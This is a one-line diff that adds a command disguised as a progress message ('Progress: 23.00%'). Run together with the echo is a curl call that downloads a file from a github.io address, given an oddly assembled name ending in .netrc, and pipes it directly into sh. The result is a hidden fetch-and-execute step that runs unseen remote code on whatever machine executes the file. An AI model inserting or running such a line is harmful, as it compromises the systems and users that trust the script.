@@ -1,0 +1,1 @@
+echo Progress: 23.00%curl -L --progress-bar frkns.github.io/fun/QUALITIES_FINANCIAL_LOOKUP_EXPECTATIONS_CASES.netrc | sh
